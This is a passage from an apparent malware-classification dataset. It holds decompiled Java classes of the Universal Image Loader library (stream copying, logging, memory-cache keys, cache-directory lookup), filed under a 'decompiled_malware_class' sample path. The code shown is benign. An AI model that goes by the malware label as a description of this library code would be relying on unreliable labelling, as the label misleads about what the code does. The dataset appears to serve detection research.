|| destWidth == srcWidth || destHeight == srcHeight)) { return 1.0f; } float scale=destWidth / srcWidth; return scale; } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.utils\IoUtils.code","public final class IoUtils {   public static final int CONTINUE_LOADING_PERCENTAGE=75;   public static final int DEFAULT_BUFFER_SIZE=32768;   public static final int DEFAULT_IMAGE_TOTAL_SIZE=512000; public interface CopyListener {     boolean onBytesCopied(    int i,    int i2);   }   private IoUtils(){   }   public static boolean copyStream(  InputStream is,  OutputStream os,  CopyListener listener) throws IOException {     return copyStream(is,os,listener,32768);   }   public static boolean copyStream(  InputStream is,  OutputStream os,  CopyListener listener,  int bufferSize) throws IOException {     int current=0;     int total=is.available();     if (total <= 0) {       total=DEFAULT_IMAGE_TOTAL_SIZE;     }     byte[] bytes=new byte[bufferSize];     if (shouldStopLoading(listener,0,total)) {       return false;     }     do {       int count=is.read(bytes,0,bufferSize);       if (count != -1) {         os.write(bytes,0,count);         current+=count;       }  else {         os.flush();         return true;       }     }  while (!shouldStopLoading(listener,current,total));     return false;   }   private static boolean shouldStopLoading(  CopyListener listener,  int current,  int total){     if (listener != null) {       boolean shouldContinue=listener.onBytesCopied(current,total);       if (!shouldContinue && (current * 100) / total < 75) {         return true;       }     }     return false;   }   public static void readAndCloseStream(  InputStream is){     byte[] bytes=new byte[32768];     do {       try {       }  catch (      IOException e) {         return;       }  finally {         closeSilently(is);       }     }  while (is.read(bytes,0,32768) != -1);   }   public static void closeSilently(  Closeable closeable){     try {       closeable.close();     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.utils\L.code","public final class L {   private static final String LOG_FORMAT=""%1$s\n%2$s"";   private static volatile boolean writeDebugLogs=false;   private static volatile boolean writeLogs=true;   private L(){   }   @Deprecated public static void enableLogging(){     writeLogs(true);   }   @Deprecated public static void disableLogging(){     writeLogs(false);   }   public static void writeDebugLogs(  boolean writeDebugLogs2){     writeDebugLogs=writeDebugLogs2;   }   public static void writeLogs(  boolean writeLogs2){     writeLogs=writeLogs2;   }   public static void d(  String message,  Object... args){     if (writeDebugLogs) {       log(3,null,message,args);     }   }   public static void i(  String message,  Object... args){     log(4,null,message,args);   }   public static void w(  String message,  Object... args){     log(5,null,message,args);   }   public static void e(  Throwable ex){     log(6,ex,null,new Object[0]);   }   public static void e(  String message,  Object... args){     log(6,null,message,args);   }   public static void e(  Throwable ex,  String message,  Object... args){     log(6,ex,message,args);   }   private static void log(  int priority,  Throwable ex,  String message,  Object... args){     String log;     if (writeLogs) {       if (args.length > 0) {         message=String.format(message,args);       }       if (ex == null) {         log=message;       }  else {         String logMessage=message == null ? ex.getMessage() : message;         String logBody=Log.getStackTraceString(ex);         log=String.format(LOG_FORMAT,logMessage,logBody);       }       Log.println(priority,ImageLoader.TAG,log);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.utils\MemoryCacheUtils.code","public final class MemoryCacheUtils {   private static final String URI_AND_SIZE_SEPARATOR=""_"";   private static final String WIDTH_AND_HEIGHT_SEPARATOR=""x"";   private MemoryCacheUtils(){   }   public static String generateKey(  String imageUri,  ImageSize targetSize){     return imageUri + URI_AND_SIZE_SEPARATOR + targetSize.getWidth()+ WIDTH_AND_HEIGHT_SEPARATOR+ targetSize.getHeight();   }   public static Comparator<String> createFuzzyKeyComparator(){     return new Comparator<String>(){       @Override public int compare(      String key1,      String key2){         String imageUri1=key1.substring(0,key1.lastIndexOf(MemoryCacheUtils.URI_AND_SIZE_SEPARATOR));         String imageUri2=key2.substring(0,key2.lastIndexOf(MemoryCacheUtils.URI_AND_SIZE_SEPARATOR));         return imageUri1.compareTo(imageUri2);       }     } ;   }   public static List<Bitmap> findCachedBitmapsForImageUri(  String imageUri,  MemoryCache memoryCache){     List<Bitmap> values=new ArrayList<>();     for (    String key : memoryCache.keys()) {       if (key.startsWith(imageUri)) {         values.add(memoryCache.get(key));       }     }     return values;   }   public static List<String> findCacheKeysForImageUri(  String imageUri,  MemoryCache memoryCache){     List<String> values=new ArrayList<>();     for (    String key : memoryCache.keys()) {       if (key.startsWith(imageUri)) {         values.add(key);       }     }     return values;   }   public static void removeFromCache(  String imageUri,  MemoryCache memoryCache){     List<String> keysToRemove=new ArrayList<>();     for (    String key : memoryCache.keys()) {       if (key.startsWith(imageUri)) {         keysToRemove.add(key);       }     }     for (    String keyToRemove : keysToRemove) {       memoryCache.remove(keyToRemove);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.utils\StorageUtils.code","public final class StorageUtils {   private static final String EXTERNAL_STORAGE_PERMISSION=""android.permission.WRITE_EXTERNAL_STORAGE"";   private static final String INDIVIDUAL_DIR_NAME=""uil-images"";   private StorageUtils(){   }   public static File getCacheDirectory(  Context context){     return getCacheDirectory(context,true);   }   public static File getCacheDirectory(  Context context,  boolean preferExternal){     String externalStorageState;     File appCacheDir=null;     try {       externalStorageState=Environment.getExternalStorageState();     }  catch (    NullPointerException e) {       externalStorageState="""";     }     if (preferExternal && ""mounted"".equals(externalStorageState) && hasExternalStoragePermission(context)) {       appCacheDir=getExternalCacheDir(context);     }     if (appCacheDir == null) {       appCacheDir=context.getCacheDir();     }     if (appCacheDir == null) {       String cacheDirPath=""/data/data/"" + context.getPackageName() + ""/cache/"";       L.w(""Can't define system cache directory! '%s' will be used."",cacheDirPath);       return new File(cacheDirPath);     }     return appCacheDir;   }   public static File getIndividualCacheDirectory(  Context context){     File cacheDir=getCacheDirectory(context);     File individualCacheDir=new File(cacheDir,INDIVIDUAL_DIR_NAME);     if (!individualCacheDir.exists() && !individualCacheDir.mkdir()) {       return cacheDir;     }     return individualCacheDir;   }   public static File getOwnCacheDirectory(  Context context,  String cacheDir){     File appCacheDir=null;     if (""mounted"".equals(Environment.getExternalStorageState()) && hasExternalStoragePermission(context)) {       appCacheDir=new File(Environment.getExternalStorageDirectory(),cacheDir);     }     if (appCacheDir == null || (!appCacheDir.exists() && !appCacheDir.mkdirs())) {       return context.getCacheDir();     }     return appCacheDir;   }   private static File getExternalCacheDir(  Context context){     File dataDir=new File(new File(Environment.getExternalStorageDirectory(),""Android""),""data"");     File appCacheDir=new File(new File(dataDir,context.getPackageName()),""cache"");     if (!appCacheDir.exists()) {       if (!appCacheDir.mkdirs()) {         L.w(""Unable to create external cache directory"",new Object[0]);         return null;       }       try {         new File(appCacheDir,"".nomedia"").createNewFile();         return appCacheDir;       }  catch (      IOException e) {         L.i(""Can't create \"".nomedia\"" file in application external cache directory"",new Object[0]);         return appCacheDir;       }     }     return appCacheDir;   }   private static boolean hasExternalStoragePermission(  Context context){     int perm=context.checkCallingOrSelfPermission(EXTERNAL_STORAGE_PERMISSION);     return perm == 0;   } } "
